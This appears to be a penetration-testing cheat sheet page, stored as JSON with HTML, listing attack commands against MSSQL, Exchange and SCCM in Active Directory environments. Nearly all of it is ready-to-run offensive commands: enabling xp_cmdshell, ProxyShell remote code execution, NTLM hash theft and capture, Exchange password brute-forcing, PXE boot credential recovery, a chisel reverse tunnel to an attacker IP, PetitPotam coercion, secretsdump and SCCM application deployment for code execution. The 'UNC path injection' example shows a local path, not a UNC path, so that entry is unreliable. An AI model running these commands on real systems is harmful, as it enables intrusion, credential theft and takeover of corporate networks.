{"title": "MSSQL, Exchange & SCCM", "source": "active-directory", "source_label": "Active Directory", "path": "Active Directory/MSSQL Exchange SCCM", "html": "<h2 id=\"mssql-attacks\">MSSQL Attacks</h2>\n<h3 id=\"connect-to-mssql\">Connect to MSSQL</h3>\n<div class=\"highlight\"><pre><span></span><code>impacket-mssqlclient<span class=\"w\"> </span>&lt;username&gt;@&lt;target-ip&gt;\nmssqlclient.py<span class=\"w\"> </span>&lt;DOMAIN&gt;/&lt;username&gt;@&lt;target-ip&gt;<span class=\"w\"> </span>-windows-auth\n</code></pre></div>\n<h3 id=\"enumerate-server-logins-and-roles\">Enumerate Server Logins and Roles</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">SELECT</span><span class=\"w\"> </span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">name</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">type_desc</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">is_disabled</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">sysadmin</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">securityadmin</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">serveradmin</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">setupadmin</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">processadmin</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">diskadmin</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">dbcreator</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">bulkadmin</span>\n<span class=\"k\">FROM</span><span class=\"w\"> </span><span class=\"n\">master</span><span class=\"p\">.</span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">server_principals</span><span class=\"w\"> </span><span class=\"n\">r</span>\n<span class=\"k\">LEFT</span><span class=\"w\"> </span><span class=\"k\">JOIN</span><span class=\"w\"> </span><span class=\"n\">master</span><span class=\"p\">.</span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">syslogins</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"w\"> </span><span class=\"k\">ON</span><span class=\"w\"> </span><span class=\"n\">sl</span><span class=\"p\">.</span><span class=\"n\">sid</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"n\">sid</span>\n<span class=\"k\">WHERE</span><span class=\"w\"> </span><span class=\"n\">r</span><span class=\"p\">.</span><span class=\"k\">type</span><span class=\"w\"> </span><span class=\"k\">IN</span><span class=\"w\"> </span><span class=\"p\">(</span><span class=\"s1\">&#39;S&#39;</span><span class=\"p\">,</span><span class=\"s1\">&#39;E&#39;</span><span class=\"p\">,</span><span class=\"s1\">&#39;X&#39;</span><span class=\"p\">,</span><span class=\"s1\">&#39;U&#39;</span><span class=\"p\">,</span><span class=\"s1\">&#39;G&#39;</span><span class=\"p\">);</span>\n</code></pre></div>\n<h3 id=\"enumerate-databases-and-trust-status\">Enumerate Databases and Trust Status</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">SELECT</span><span class=\"w\"> </span><span class=\"n\">a</span><span class=\"p\">.</span><span class=\"n\">name</span><span class=\"w\"> </span><span class=\"k\">AS</span><span class=\"w\"> </span><span class=\"s1\">&#39;database&#39;</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">b</span><span class=\"p\">.</span><span class=\"n\">name</span><span class=\"w\"> </span><span class=\"k\">AS</span><span class=\"w\"> </span><span class=\"s1\">&#39;owner&#39;</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"n\">is_trustworthy_on</span>\n<span class=\"k\">FROM</span><span class=\"w\"> </span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">databases</span><span class=\"w\"> </span><span class=\"n\">a</span>\n<span class=\"k\">JOIN</span><span class=\"w\"> </span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">server_principals</span><span class=\"w\"> </span><span class=\"n\">b</span><span class=\"w\"> </span><span class=\"k\">ON</span><span class=\"w\"> </span><span class=\"n\">a</span><span class=\"p\">.</span><span class=\"n\">owner_sid</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">b</span><span class=\"p\">.</span><span class=\"n\">sid</span><span class=\"p\">;</span>\n</code></pre></div>\n<h3 id=\"check-login-impersonation-privileges\">Check Login Impersonation Privileges</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">SELECT</span><span class=\"w\"> </span><span class=\"n\">name</span><span class=\"w\"> </span><span class=\"k\">FROM</span><span class=\"w\"> </span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">server_permissions</span>\n<span class=\"k\">JOIN</span><span class=\"w\"> </span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">server_principals</span>\n<span class=\"k\">ON</span><span class=\"w\"> </span><span class=\"n\">grantor_principal_id</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"n\">principal_id</span>\n<span class=\"k\">WHERE</span><span class=\"w\"> </span><span class=\"n\">permission_name</span><span class=\"w\"> </span><span class=\"o\">=</span><span class=\"w\"> </span><span class=\"s1\">&#39;IMPERSONATE&#39;</span><span class=\"p\">;</span>\n</code></pre></div>\n<h3 id=\"unc-path-injection-capture-hash\">UNC Path Injection (Capture Hash)</h3>\n<p>Forces the SQL server to authenticate to your attacker listener via SMB, capturing an NTLMv2 hash.</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">EXEC</span><span class=\"w\"> </span><span class=\"n\">xp_fileexist</span><span class=\"w\"> </span><span class=\"s1\">&#39;C:\\Windows\\System32\\drivers\\etc\\hosts&#39;</span><span class=\"p\">;</span>\n</code></pre></div>\n<h3 id=\"enable-and-use-xp_cmdshell\">Enable and Use xp_cmdshell</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">EXEC</span><span class=\"w\"> </span><span class=\"n\">sp_configure</span><span class=\"w\"> </span><span class=\"s1\">&#39;show advanced options&#39;</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"n\">RECONFIGURE</span><span class=\"p\">;</span>\n<span class=\"k\">EXEC</span><span class=\"w\"> </span><span class=\"n\">sp_configure</span><span class=\"w\"> </span><span class=\"s1\">&#39;xp_cmdshell&#39;</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"n\">RECONFIGURE</span><span class=\"p\">;</span>\n<span class=\"k\">EXEC</span><span class=\"w\"> </span><span class=\"n\">xp_cmdshell</span><span class=\"w\"> </span><span class=\"s1\">&#39;ipconfig&#39;</span><span class=\"p\">;</span>\n</code></pre></div>\n<h3 id=\"enable-ole-automation\">Enable OLE Automation</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">EXEC</span><span class=\"w\"> </span><span class=\"n\">sp_configure</span><span class=\"w\"> </span><span class=\"s1\">&#39;show advanced options&#39;</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"n\">RECONFIGURE</span><span class=\"p\">;</span>\n<span class=\"k\">EXEC</span><span class=\"w\"> </span><span class=\"n\">sp_configure</span><span class=\"w\"> </span><span class=\"s1\">&#39;ole automation procedures&#39;</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"n\">RECONFIGURE</span><span class=\"p\">;</span>\n</code></pre></div>\n<h3 id=\"enumerate-linked-servers\">Enumerate Linked Servers</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">EXEC</span><span class=\"w\"> </span><span class=\"n\">sp_linkedservers</span><span class=\"p\">;</span>\n</code></pre></div>\n<h3 id=\"execute-queries-on-linked-server\">Execute Queries on Linked Server</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"k\">SELECT</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"k\">FROM</span><span class=\"w\"> </span><span class=\"n\">OPENQUERY</span><span class=\"p\">(</span><span class=\"o\">&lt;</span><span class=\"n\">linked</span><span class=\"o\">-</span><span class=\"n\">server</span><span class=\"o\">-</span><span class=\"n\">name</span><span class=\"o\">&gt;</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s1\">&#39;SELECT name, database_id, create_date FROM sys.databases&#39;</span><span class=\"p\">);</span>\n<span class=\"k\">SELECT</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"k\">FROM</span><span class=\"w\"> </span><span class=\"n\">OPENQUERY</span><span class=\"p\">(</span><span class=\"o\">&lt;</span><span class=\"n\">linked</span><span class=\"o\">-</span><span class=\"n\">server</span><span class=\"o\">-</span><span class=\"n\">name</span><span class=\"o\">&gt;</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"s1\">&#39;SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&#39;</span><span class=\"p\">);</span>\n</code></pre></div>\n<h3 id=\"mssql-from-windows-powerupsql\">MSSQL from Windows (PowerUpSQL)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Import-Module</span> <span class=\"p\">.\\</span><span class=\"n\">PowerUpSQL</span><span class=\"p\">.</span><span class=\"n\">ps1</span>\n<span class=\"nb\">Get-SQLInstanceDomain</span>\n<span class=\"nb\">Get-SQLQuery</span> <span class=\"n\">-Verbose</span> <span class=\"n\">-Instance</span> <span class=\"s2\">&quot;&lt;target-ip&gt;,1433&quot;</span> <span class=\"n\">-username</span> <span class=\"s2\">&quot;&lt;domain&gt;\\&lt;username&gt;&quot;</span> <span class=\"n\">-password</span> <span class=\"s2\">&quot;&lt;password&gt;&quot;</span> <span class=\"n\">-query</span> <span class=\"s1\">&#39;Select @@version&#39;</span>\n</code></pre></div>\n<h3 id=\"interactive-sql-via-mssqlclientpy\">Interactive SQL via mssqlclient.py</h3>\n<div class=\"highlight\"><pre><span></span><code>SQL&gt;<span class=\"w\"> </span><span class=\"nb\">help</span>\nSQL&gt;<span class=\"w\"> </span>enable_xp_cmdshell\nxp_cmdshell<span class=\"w\"> </span>whoami<span class=\"w\"> </span>/priv\n</code></pre></div>\n<hr />\n<h2 id=\"exchange-attacks\">Exchange Attacks</h2>\n<h3 id=\"version-enumeration\">Version Enumeration</h3>\n<div class=\"highlight\"><pre><span></span><code>curl<span class=\"w\"> </span>https://&lt;target-ip&gt;/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application<span class=\"w\"> </span>-k<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>xmllint<span class=\"w\"> </span>--format<span class=\"w\"> </span>-<span class=\"w\"> </span><span class=\"p\">|</span><span class=\"w\"> </span>grep<span class=\"w\"> </span>version\n</code></pre></div>\n<h3 id=\"ntlm-hash-theft-via-html-file\">NTLM Hash Theft via HTML File</h3>\n<p>Send a crafted HTML to an internal user to capture their NTLMv2 hash.</p>\n<div class=\"highlight\"><pre><span></span><code>python3<span class=\"w\"> </span>ntlm_theft.py<span class=\"w\"> </span>-g<span class=\"w\"> </span>htm<span class=\"w\"> </span>-s<span class=\"w\"> </span>&lt;attacker-ip&gt;<span class=\"w\"> </span>-f<span class=\"w\"> </span>&lt;username&gt;\n</code></pre></div>\n<h3 id=\"proxyshell-exploit\">ProxyShell Exploit</h3>\n<p>Unauthenticated RCE chain (CVE-2021-34473 / CVE-2021-34523 / CVE-2021-31207).</p>\n<div class=\"highlight\"><pre><span></span><code>python3<span class=\"w\"> </span>proxyshell.py<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;exchange-url&gt;<span class=\"w\"> </span>-e<span class=\"w\"> </span>&lt;target-email&gt;\n</code></pre></div>\n<h3 id=\"username-generation-for-spray\">Username Generation for Spray</h3>\n<div class=\"highlight\"><pre><span></span><code>./username-anarchy<span class=\"w\"> </span>--input-file<span class=\"w\"> </span>./names.txt\n</code></pre></div>\n<h3 id=\"ruler-brute-force-exchange-credentials\">Ruler - Brute Force Exchange Credentials</h3>\n<div class=\"highlight\"><pre><span></span><code>./ruler-linux64<span class=\"w\"> </span>--domain<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>--insecure<span class=\"w\"> </span>brute<span class=\"w\"> </span>--users<span class=\"w\"> </span>users.txt<span class=\"w\"> </span>--passwords<span class=\"w\"> </span>password.txt<span class=\"w\"> </span>--verbose\n</code></pre></div>\n<hr />\n<h2 id=\"sccm-attacks\">SCCM Attacks</h2>\n<h3 id=\"pxe-boot-attack-pxethief\">PXE Boot Attack (PXEThief)</h3>\n<p>If PXE boot is enabled without password protection, recover configuration and credentials from boot images.</p>\n<div class=\"highlight\"><pre><span></span><code>python<span class=\"w\"> </span>.<span class=\"se\">\\p</span>xethief.py<span class=\"w\"> </span><span class=\"m\">2</span><span class=\"w\"> </span>&lt;target-ip&gt;\ntftp<span class=\"w\"> </span>-i<span class=\"w\"> </span>&lt;target-ip&gt;<span class=\"w\"> </span>GET<span class=\"w\"> </span><span class=\"s2\">&quot;\\SMSTemp\\&lt;timestamp&gt;.{&lt;guid&gt;}.boot.var&quot;</span><span class=\"w\"> </span><span class=\"s2\">&quot;&lt;timestamp&gt;.{&lt;guid&gt;}.boot.var&quot;</span>\npython<span class=\"w\"> </span>.<span class=\"se\">\\p</span>xethief.py<span class=\"w\"> </span><span class=\"m\">5</span><span class=\"w\"> </span><span class=\"s1\">&#39;.\\&lt;timestamp&gt;.{&lt;guid&gt;}.boot.var&#39;</span>\nhashcat/hashcat<span class=\"w\"> </span>-m<span class=\"w\"> </span><span class=\"m\">19850</span><span class=\"w\"> </span>--force<span class=\"w\"> </span>-a<span class=\"w\"> </span><span class=\"m\">0</span><span class=\"w\"> </span>hashcat/hash<span class=\"w\"> </span>/usr/share/wordlists/rockyou.txt\npython<span class=\"w\"> </span>.<span class=\"se\">\\p</span>xethief.py<span class=\"w\"> </span><span class=\"m\">3</span><span class=\"w\"> </span><span class=\"s1\">&#39;.\\&lt;timestamp&gt;.{&lt;guid&gt;}.boot.var&#39;</span><span class=\"w\"> </span><span class=\"s2\">&quot;&lt;password&gt;&quot;</span>\n</code></pre></div>\n<h3 id=\"chisel-tunneling-for-internal-access\">Chisel Tunneling for Internal Access</h3>\n<div class=\"highlight\"><pre><span></span><code>./chisel<span class=\"w\"> </span>server<span class=\"w\"> </span>--reverse\n.<span class=\"se\">\\c</span>hisel.exe<span class=\"w\"> </span>client<span class=\"w\"> </span>&lt;attacker-ip&gt;:8080<span class=\"w\"> </span>R:socks\n</code></pre></div>\n<h3 id=\"sccmhunter-discovery-and-enumeration\">SCCMHunter - Discovery and Enumeration</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>sccmhunter.py<span class=\"w\"> </span>find<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;\npython3<span class=\"w\"> </span>sccmhunter.py<span class=\"w\"> </span>show<span class=\"w\"> </span>-all\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>sccmhunter.py<span class=\"w\"> </span>smb<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-save\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>sccmhunter.py<span class=\"w\"> </span>admin<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-ip<span class=\"w\"> </span>&lt;sccm-ip&gt;\nproxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>sccmhunter.py<span class=\"w\"> </span>admin<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-ip<span class=\"w\"> </span>&lt;sccm-ip&gt;<span class=\"w\"> </span>-au<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;computer-name&gt;&#39;</span><span class=\"w\"> </span>-ap<span class=\"w\"> </span>&lt;computer-password&gt;\n</code></pre></div>\n<h3 id=\"dpapi-via-sccmhunter\">DPAPI via SCCMHunter</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>python3<span class=\"w\"> </span>sccmhunter.py<span class=\"w\"> </span>dpapi<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;password&gt;<span class=\"w\"> </span>-d<span class=\"w\"> </span>&lt;domain&gt;<span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span>-target<span class=\"w\"> </span>&lt;target-ip&gt;<span class=\"w\"> </span>-wmi\n</code></pre></div>\n<h3 id=\"petitpotam-via-proxychains-coerce-sccm-server\">PetitPotam via proxychains (Coerce SCCM Server)</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-f<span class=\"w\"> </span>&lt;proxy-conf&gt;<span class=\"w\"> </span>python3<span class=\"w\"> </span>PetitPotam.py<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;username&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>-d<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;&#39;</span><span class=\"w\"> </span>&lt;proxy-ip&gt;<span class=\"w\"> </span>&lt;target-ip&gt;\n</code></pre></div>\n<h3 id=\"connect-to-sccm-mssql-via-proxychains\">Connect to SCCM MSSQL via proxychains</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>-f<span class=\"w\"> </span>&lt;proxy-conf&gt;<span class=\"w\"> </span>mssqlclient.py<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span>@&lt;target-ip&gt;<span class=\"w\"> </span>-windows-auth<span class=\"w\"> </span>-no-pass\n</code></pre></div>\n<h3 id=\"get-domain-user-sid\">Get Domain User SID</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainUser</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"n\">-Properties</span> <span class=\"n\">objectsid</span>\n</code></pre></div>\n<h3 id=\"dump-secrets-via-proxychains\">Dump Secrets via proxychains</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>-f<span class=\"w\"> </span>&lt;proxy-conf&gt;<span class=\"w\"> </span>secretsdump.py<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span>@&lt;target-ip&gt;<span class=\"w\"> </span>-no-pass\n</code></pre></div>\n<h3 id=\"sccmhunter-with-ntlm-hash-auth\">SCCMHunter with NTLM Hash Auth</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>-f<span class=\"w\"> </span>&lt;proxy-conf&gt;<span class=\"w\"> </span>python3<span class=\"w\"> </span>sccmhunter.py<span class=\"w\"> </span>admin<span class=\"w\"> </span>-u<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;username&gt;&#39;</span><span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;ntlm-hash&gt;<span class=\"w\"> </span>-ip<span class=\"w\"> </span>&lt;target-ip&gt;\n</code></pre></div>\n<h3 id=\"add-computer-for-sccm-client-push-attack\">Add Computer for SCCM Client Push Attack</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains4<span class=\"w\"> </span>-q<span class=\"w\"> </span>addcomputer.py<span class=\"w\"> </span>-computer-name<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;computer-name&gt;&#39;</span><span class=\"w\"> </span>-computer-pass<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;computer-password&gt;&#39;</span><span class=\"w\"> </span>-dc-ip<span class=\"w\"> </span>&lt;dc-ip&gt;<span class=\"w\"> </span><span class=\"s1\">&#39;&lt;domain&gt;/&lt;username&gt;&#39;</span>:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span>\n</code></pre></div>\n<h3 id=\"invoke-client-push-sharpsccm\">Invoke Client Push (SharpSCCM)</h3>\n<p>Forces SCCM to push the client installer to a target, causing it to authenticate to you.</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">invoke</span> <span class=\"n\">client-push</span> <span class=\"n\">-t</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"sharpsccm-device-enumeration\">SharpSCCM Device Enumeration</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">get</span> <span class=\"n\">devices</span> <span class=\"n\">-n</span> <span class=\"p\">&lt;</span><span class=\"n\">sccm-server</span><span class=\"p\">&gt;</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">get</span> <span class=\"n\">devices</span> <span class=\"n\">-w</span> <span class=\"s2\">&quot;&lt;filter-condition&gt;&quot;</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">get</span> <span class=\"n\">class-instances</span> <span class=\"p\">&lt;</span><span class=\"n\">class-name</span><span class=\"p\">&gt;</span> <span class=\"n\">-p</span> <span class=\"p\">&lt;</span><span class=\"n\">prop1</span><span class=\"p\">&gt;</span> <span class=\"n\">-p</span> <span class=\"p\">&lt;</span><span class=\"n\">prop2</span><span class=\"p\">&gt;</span> <span class=\"n\">-p</span> <span class=\"p\">&lt;</span><span class=\"n\">prop3</span><span class=\"p\">&gt;</span> <span class=\"n\">-p</span> <span class=\"p\">&lt;</span><span class=\"n\">prop4</span><span class=\"p\">&gt;</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">get</span> <span class=\"n\">primary-users</span> <span class=\"n\">-u</span> <span class=\"p\">&lt;</span><span class=\"n\">username</span><span class=\"p\">&gt;</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"sharpsccm-deploy-application-for-code-execution\">SharpSCCM - Deploy Application for Code Execution</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">new</span> <span class=\"n\">application</span> <span class=\"n\">-s</span> <span class=\"n\">-n</span> <span class=\"p\">&lt;</span><span class=\"n\">app-name</span><span class=\"p\">&gt;</span> <span class=\"n\">-p</span> <span class=\"p\">&lt;</span><span class=\"n\">path-to-executable</span><span class=\"p\">&gt;</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">new</span> <span class=\"n\">collection</span> <span class=\"n\">-n</span> <span class=\"s2\">&quot;&lt;collection-name&gt;&quot;</span> <span class=\"n\">-t</span> <span class=\"n\">device</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">new</span> <span class=\"n\">collection-member</span> <span class=\"n\">-d</span> <span class=\"p\">&lt;</span><span class=\"n\">device-name</span><span class=\"p\">&gt;</span> <span class=\"n\">-n</span> <span class=\"s2\">&quot;&lt;collection-name&gt;&quot;</span> <span class=\"n\">-t</span> <span class=\"n\">device</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">new</span> <span class=\"n\">deployment</span> <span class=\"n\">-a</span> <span class=\"p\">&lt;</span><span class=\"n\">app-name</span><span class=\"p\">&gt;</span> <span class=\"n\">-c</span> <span class=\"s2\">&quot;&lt;collection-name&gt;&quot;</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">SharpSCCM</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">invoke</span> <span class=\"n\">update</span> <span class=\"n\">-n</span> <span class=\"s2\">&quot;&lt;collection-name&gt;&quot;</span> <span class=\"n\">-sms</span> <span class=\"p\">&lt;</span><span class=\"n\">target-ip</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"inveigh-for-hash-capture-during-client-push\">Inveigh for Hash Capture During Client Push</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Inveigh</span><span class=\"p\">.</span><span class=\"n\">exe</span>\n</code></pre></div>\n<h3 id=\"xfreerdp-to-sccm-targets\">xfreerdp to SCCM Targets</h3>\n<div class=\"highlight\"><pre><span></span><code>xfreerdp<span class=\"w\"> </span>/u:&lt;username&gt;<span class=\"w\"> </span>/p:<span class=\"s1\">&#39;&lt;password&gt;&#39;</span><span class=\"w\"> </span>/d:&lt;domain&gt;<span class=\"w\"> </span>/v:&lt;target-ip&gt;<span class=\"w\"> </span>/dynamic-resolution<span class=\"w\"> </span>/drive:.,linux<span class=\"w\"> </span>/bpp:8<span class=\"w\"> </span>/compression<span class=\"w\"> </span>-themes<span class=\"w\"> </span>-wallpaper<span class=\"w\"> </span>/clipboard<span class=\"w\"> </span>/audio-mode:0<span class=\"w\"> </span>/auto-reconnect<span class=\"w\"> </span>-glyph-cache\n</code></pre></div>", "excerpt": "MSSQL Attacks Connect to MSSQL impacket-mssqlclient &lt;username&gt;@&lt;target-ip&gt; mssqlclient.py &lt;DOMAIN&gt;/&lt;username&gt;@&lt;target-ip&gt; -windows-auth Enumerate Server Logins and Roles ", "tags": []}